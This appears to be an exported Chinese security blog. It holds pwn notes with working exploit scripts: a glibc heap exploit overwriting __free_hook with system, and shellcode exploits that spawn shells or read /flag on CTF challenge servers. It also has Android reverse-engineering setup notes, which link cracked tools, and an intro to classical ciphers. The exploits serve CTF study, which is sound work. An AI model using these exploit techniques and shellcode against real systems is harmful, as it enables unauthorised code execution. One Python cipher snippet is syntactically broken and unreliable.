p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Check:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Delete:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Recover&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak key</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x420</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">libc_addr = (u64(p.recv(<span class="number">8</span>))^key) </span><br><span class="line">libc_base = libc_addr -<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#chunk0 -&gt; largebin</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc_base + <span class="number">0x1eb280</span> + <span class="number">0x50</span> - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache double free </span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">recover(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>, p64(system))</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a class="header-anchor" href="#参考">¶</a>参考</h2>
<p><a href="https://blog.csdn.net/zero_lee/article/details/7865481">https://blog.csdn.net/zero_lee/article/details/7865481</a><br>
<a href="https://www.bilibili.com/video/BV1Uv411j7fr?p=24">https://www.bilibili.com/video/BV1Uv411j7fr?p=24</a><br>
<a href="https://www.freebuf.com/articles/system/209096.html">https://www.freebuf.com/articles/system/209096.html</a><br>
<a href="http://blog.eonew.cn/archives/858#glibc-223mallocmallocc_3532">http://blog.eonew.cn/archives/858#glibc-223mallocmallocc_3532</a><br>
<a href="https://blog.csdn.net/qq_41202237/article/details/112825556">https://blog.csdn.net/qq_41202237/article/details/112825556</a><br>
<a href="https://www.anquanke.com/post/id/244018">https://www.anquanke.com/post/id/244018</a><br>
<a href="https://www.jianshu.com/p/d2588586a47d">https://www.jianshu.com/p/d2588586a47d</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode</title>
    <url>/2021/10/04/shellcode/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/31.jpg" alt="pic"></p>
<span id="more"></span>
<h3 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h3>
<pre><code>在pwn中shellcode利用方式一般为触发中断（int 0x80 或 syscall）来进行系统调用
system(&quot;/bin/sh&quot;)，实际上就是调用execve(&quot;/bin/sh&quot;,0,0)
</code></pre>
<h3 id="示例程序"><a class="header-anchor" href="#示例程序">¶</a>示例程序</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -m32 1.c -o shell</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="syscall-调用表"><a class="header-anchor" href="#syscall-调用表">¶</a>syscall 调用表</h3>
<pre><code>https://publicki.top/syscall.html
</code></pre>
<h3 id="使用pwntools生成shellcode"><a class="header-anchor" href="#使用pwntools生成shellcode">¶</a>使用pwntools生成shellcode</h3>
<p>32位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;1386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
<p>64位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
<p>mips</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;mips&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh())</span><br></pre></td></tr></table></figure>
<p>arm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.aarch64.linux.sh())</span><br></pre></td></tr></table></figure>
<p><strong>坑</strong></p>
<pre><code>在运行生成mips和arm架构的shellcode时会有一系列的报错
这里给出解决方案
git clone https://github.com/Gallopsled/pwntools-binutils
cd pwntools-binutils/ubuntu
chmod +x install_all.sh
./install_all.sh arm
</code></pre>
<h3 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h3>
<h4 id="mrctf2020-shellcode"><a class="header-anchor" href="#mrctf2020-shellcode">¶</a>mrctf2020_shellcode</h4>
<p><img src="http://static.zybuluo.com/hgggg/8spatck2bpkcvt8mm9zt1fcz/1.png" alt="1.png-65.6kB"></p>
<p>从ida中我们可以看到，程序的功能为读入0x400字节，然后执行读入的内容<br>
<img src="http://static.zybuluo.com/hgggg/yy6gc7b9ficlvskr65bow8oi/2.png" alt="2.png-150.2kB"></p>
<p>同时栈上有可执行权限</p>
<p>那接下来编写exp</p>
<h5 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;sp&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26936</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;mrctf2020_shellcode&#x27;)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode1 = asm(shellcode1)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Show me your magic!&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是在CTF比赛中往往会对输入长度进行限制所以有时也需要自己编写shellcode</p>
<h4 id="mrctf2020-shellcode-revenge"><a class="header-anchor" href="#mrctf2020-shellcode-revenge">¶</a>mrctf2020_shellcode_revenge</h4>
<p>本题与上一题相似，不过却只能用可见字符构造shellcode,这里使用alpha3来生成<br>
<img src="http://static.zybuluo.com/hgggg/uh8qelgi14ohooggd5leq8xx/3.png" alt="3.png-91kB"></p>
<h5 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> ```python</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29931</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Show me your magic!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode1 = asm(shellcode1)</span></span><br><span class="line"><span class="string">print(shellcode1)</span></span><br><span class="line"><span class="string">payload1 = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M150m0M0R2o7O2q0H0k10030O2J142M0H2N160Y0m0H18140l07121L0m0L121M0c7L0m1O0m0N0V0o11010H2L130R2j0l0l2t100Q0m0J110y2Z0m&#x27;</span></span><br><span class="line"><span class="string">r.send(payload1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure>
<h4 id="ciscn-s-6"><a class="header-anchor" href="#ciscn-s-6">¶</a>ciscn_s_6</h4>
<p>IDA分析<br>
<img src="http://static.zybuluo.com/hgggg/geyqzixywspeaygt9mbfbt63/4.png" alt="4.png-31.2kB"></p>
<p><img src="http://static.zybuluo.com/hgggg/8fpecaqjnig5pzidt5eziv8c/5.png" alt="5.png-14.8kB"><br>
思路</p>
<pre><code>pwn函数存在明显的栈溢出，我们可以通过读入shellcode并将返回地址覆盖为jmp esp之后去调用之前的shellcode
由于输入长度限制，本题需手写shellcode
</code></pre>
<h5 id="exp-v3"><a class="header-anchor" href="#exp-v3">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x8048554</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26139</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;ciscn_s_9&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov al,0xb</span></span><br><span class="line"><span class="string">int 0x80                </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0</span>) +p32(ret_addr) + asm(<span class="string">&quot;sub esp,40;call esp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="pwnable-orw"><a class="header-anchor" href="#pwnable-orw">¶</a>pwnable_orw</h4>
<p>题目分析<br>
<img src="http://static.zybuluo.com/hgggg/mkqj8y9s162gf0du6t1o7cev/6.png" alt="6.png-42.5kB"></p>
<p><img src="http://static.zybuluo.com/hgggg/x6ddonudswawwmj20vq2fnl1/7.png" alt="7.png-40.7kB"></p>
<p>查看沙盒<br>
<img src="http://static.zybuluo.com/hgggg/ta0dkemu0ix3xwscl3snqfop/8.png#" alt="8.png-44.1kB"></p>
<p>发现只能使用open,read,write,那么我们就可以通过open(file)+read(file)+write(file)来实现任意文件读取</p>
<h5 id="exp-v4"><a class="header-anchor" href="#exp-v4">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25539</span>)</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;orw&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>从0开始的Android安全学习之环境搭建</title>
    <url>/2021/11/15/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84Android%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/42.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>这几个月来打了不少比赛，感觉目前的一些常规的glibc pwn在比赛中的占比越来越少，一些比较新颖的题目如android pwn , pwnweb , chrome pwn，vmpwn以及一些异构的pwn题占比渐渐增加，在加之我这个菜狗逆向菜的扣脚，所以准备开始学一些Android逆向的基础，通过学习安卓逆向来提升自己的一些逆向技能，同时了解一些App安全方面的东西，为未来进厂做个准备。问了下搞逆向的学弟给我推荐了一套<a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=742703&amp;highlight=%BD%CC%CE%D2%D0%D6%B5%DC">Android逆向的教程</a>以及Android逆向发展的一个<a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1244902&amp;highlight=%B0%B2%D7%BF%C4%E6%CF%F2">技能树</a> ，故写该系列笔记来记录学习历程</p>
<!--more-->
<h2 id="配置JDK1-7环境"><a class="header-anchor" href="#配置JDK1-7环境">¶</a>配置JDK1.7环境</h2>
<p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">下载地址</a></p>
<pre><code>安装目录为：C:\Program Files\Java\jdk1.7.0_80
设置环境变量为：
JAVA_HOME=C:\Program Files\Java\jdk1.7.0_80
CLASSPATH=.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar
PATH=;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin
</code></pre>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/1212.png" alt="pic"></p>
<h2 id="安装Android-Studio-2-2-3"><a class="header-anchor" href="#安装Android-Studio-2-2-3">¶</a>安装Android Studio 2.2.3</h2>
<p><a href="https://dl.google.com/dl/android/studio/install/2.2.3.0/android-studio-bundle-145.3537739-windows.exe">下载地址</a></p>
<h2 id="安装SDK"><a class="header-anchor" href="#安装SDK">¶</a>安装SDK</h2>
<p><a href="https://pan.baidu.com/s/1dEEoALN">下载地址</a></p>
<p>根据https://www.52pojie.cn/thread-844248-1-1.html  中的教程安装</p>
<h2 id="下载-Android-killer"><a class="header-anchor" href="#下载-Android-killer">¶</a>下载 Android killer</h2>
<p><a href="https://down.52pojie.cn/Tools/Android_Tools/AndroidKiller_v1.3.1.zip">下载地址</a></p>
<h2 id="下载-apkTool-2-3-4"><a class="header-anchor" href="#下载-apkTool-2-3-4">¶</a>下载 apkTool 2.3.4</h2>
<p><a href="https://bitbucket.org/iBotPeaches/apktool/downloads/">下载地址</a></p>
<h2 id="下载rtl230-bpl-大佬写的AndroidKiller的补丁"><a class="header-anchor" href="#下载rtl230-bpl-大佬写的AndroidKiller的补丁">¶</a>下载rtl230.bpl (大佬写的AndroidKiller的补丁)</h2>
<p><a href="https://www.52pojie.cn/thread-658341-1-1.html">下载地址</a></p>
<h2 id="安装雷电模拟器"><a class="header-anchor" href="#安装雷电模拟器">¶</a>安装雷电模拟器</h2>
<p><a href="http://www.ldmnq.com/">下载地址</a></p>
<h2 id="jeb安装"><a class="header-anchor" href="#jeb安装">¶</a>jeb安装</h2>
<p><a href="https://down.52pojie.cn/Tools/Android_Tools/jeb-2.2.7.201608151620_crack_qtfreet00.zip">下载地址</a><br>
<a href="https://www.52pojie.cn/thread-742250-1-1.html">使用教程</a></p>
<h2 id="补充"><a class="header-anchor" href="#补充">¶</a>补充</h2>
<p>关于上述的环境如何配置<a href="https://www.52pojie.cn/thread-844248-1-1.html">大佬的文章</a>中已经讲的十分详细，我就我遇到的一些问题做一些补充。</p>
<p>1.在使用Android killer 的时候提示编译失败</p>
<p>需要在apktool管理中，添加我们之前下载好的apktool<br>
<img src="https://gitee.com/Nss-harukii/images/raw/master/8.png" alt="pic"></p>
<p>2.如何使用雷电模拟器</p>
<p>打开雷电模拟器，在设置里找到开发者选项</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/9.png" alt="pic"></p>
<p>然后开启USB调试</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/10.png" alt="pic"></p>
<p>这样我们的Android Studio 和 Android Killer 就可以通过雷电模拟器来运行程序了</p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>Android笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>古典密码</title>
    <url>/2021/10/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/43.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="Crypto入门之古典篇"><a class="header-anchor" href="#Crypto入门之古典篇">¶</a>Crypto入门之古典篇</h2>
<h2 id="1-古典密码概述"><a class="header-anchor" href="#1-古典密码概述">¶</a>1.古典密码概述</h2>
<blockquote>
<ul>
<li>古典密码是密码学中的其中一个类型，其大部分加密方式都是利用<em><strong>替换式密码</strong></em> 或 <em><strong>移项式密码</strong></em>，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。一般而言，经典密码是基于一个拼音字母（像是A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。</li>
</ul>
</blockquote>
<p>古典密码通常极容易破解，大部分经典密码都很容易受到唯密文攻击法攻击（cipher text only attack）。而像凯撒这种密钥数有限的密码则容易受到爆破密钥的方式破解，替代式密码有比较大的密钥数，但是容易被频率分析，因为每个密码字母各代表了一个明文字母。多字母替代式密码密码，像是维吉尼亚密码使用多个替换防止了简单的频率分析，然而，更先进的技术卡西斯基试验就可用来破解这类密码。<br>
所以，在主流的CTF比赛中，一般不会把某种古典密码作为一个题目的核心知识点来考，在比赛中遇到时，一般在搜索引擎中搜索就可以解决。</p>
<h2 id="2-编码"><a class="header-anchor" href="#2-编码">¶</a>2.编码</h2>
<h3 id="2-1-base编码"><a class="header-anchor" href="#2-1-base编码">¶</a>2.1 base编码</h3>
<pre><code>Base64
    Base64是目前网络上最常见的用于传输8bit字节码的编码方式之一，是一种基于64个可打印字符来表示二进制数据的方法。在编码时，3个字节的数据先后（先来的字节占高位）放入一个24位的缓冲区，数据不足3字节时则用0来补足。每次选出6bit按照其值来选择 &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; 中的字符作为编码输出，若原数据长度len mod 3 = 1 则在编码后加两个&quot;=&quot;,若len mod 3 =2 则加一个&quot;=&quot;,而当刚好为3的倍数时则不会出现等号，如下图。从下图中不难发现当原数据长度不为3的倍数时，在编码时会再末位补0使其成为6的倍数，而在解码时会自动去掉所补的0，如果在编码的时候不全用0位填充而将我们想隐藏的数据放入其中，也并不会影响编码的结果，这就引出了另外一个CTF题型：Base64隐写。
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/088gcrbndggz0d84gpzhfe19/20191230221011783.png" alt="20191230221011783.png-15.6kB"><br>
<img src="http://static.zybuluo.com/hgggg/mluejayhvknagd7w429ope1h/20191230221143554%20%281%29.png" alt="20191230221143554 (1).png-15.2kB"><br>
<img src="http://static.zybuluo.com/hgggg/d87dlk5xkqgua437bou3wyt2/20191230221118387.png" alt="20191230221118387.png-14.3kB"></p>
<pre><code>其它Base编码
    除了Base64以外，Baes32和Base16也是较为常见的Base编码，它们的编码原理和Basa64一样，后者Base16也是我们常说的Hex编码即16进制，除此之外还有Base58、Baes36、Base91、uuencode、xxencode等也曾出现在CTF的比赛中，它们原理类似，只不过它们使用的码表不同，而在比赛中也常有替换码表的Baes题目。
</code></pre>
<h3 id="2-2-其他常见编码"><a class="header-anchor" href="#2-2-其他常见编码">¶</a>2.2 其他常见编码</h3>
<pre><code>ASCII码：包含大小写字母，数字，常见符号等，是互联网通用语言
摩斯电码：由点（.）、划（—）组成
URL编码：又称百分号编码、只是简单的在特殊字符的各个字节前加上%
jjencode&amp;aaencode:针对JS的编码方式，前者将JS代码转为符号和字符串、后者将之转换为常用网络表情
一般地，编码只是对原始数据进行一定地处理，使其变得方便传输、储存等操作，并不是为了加密信息，也没有密钥等额外信息，只要知道编码方式就可以还原得到数据内容。
</code></pre>
<h2 id="3-单表替换密码"><a class="header-anchor" href="#3-单表替换密码">¶</a>3.单表替换密码</h2>
<h3 id="3-1单表替换原理"><a class="header-anchor" href="#3-1单表替换原理">¶</a>3.1单表替换原理</h3>
<pre><code>单表代换是指英文字母在进行密码编码替换的时候，有一张对照表，也就是说，对于每一个字母，都是唯一对应的。
例如源字母表为：abcdefghijklmnopqrstuvwxyz
码表为：qwertyuiopasdfghjklzxcvbnm
</code></pre>
<p>加密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#s为码表,m为密文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,s</span>)&#123;</span></span><br><span class="line"><span class="function">    <span class="title">c</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="title">i</span> <span class="title">in</span> <span class="title">range</span> (<span class="params"><span class="number">0</span>,<span class="built_in">len</span>(<span class="params">m</span>)</span>):</span></span><br><span class="line">        k = <span class="built_in">ord</span>(m[i])-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        c += s[k]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,s</span>):</span></span><br><span class="line">    t = <span class="string">&quot;&quot;</span></span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        t = c[i]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> t==s[k]:</span><br><span class="line">                m += <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+k)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<h3 id="凯撒密码"><a class="header-anchor" href="#凯撒密码">¶</a>凯撒密码</h3>
<pre><code>凯撒密码是一种最为简单的替换密码，即字母表上的所有的字母向一个方向偏移n位后被替换为密文，如：当n=2时，A就被替换成了C，凯撒及其变种经常会出现在CTF古典密码学的题目中，其加解密公式为：
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/fyyuo0q5dhv857h3n7ga45ap/123456.png" alt="123456.png-10.7kB"></p>
<pre><code>    由此可以看出，当我们知道一串密文是由凯撒加密得来的时候，即使我们不知到密钥，也可以通过穷举法轻易的破解。
</code></pre>
<h3 id="仿射密码（Affine-cipher）"><a class="header-anchor" href="#仿射密码（Affine-cipher）">¶</a>仿射密码（Affine cipher）</h3>
<pre><code>仿射密码作为一种单表替换密码，码表的每个字母相应的值使用一个简单的数学函数对应一个数值
其加解密公式如下：
</code></pre>
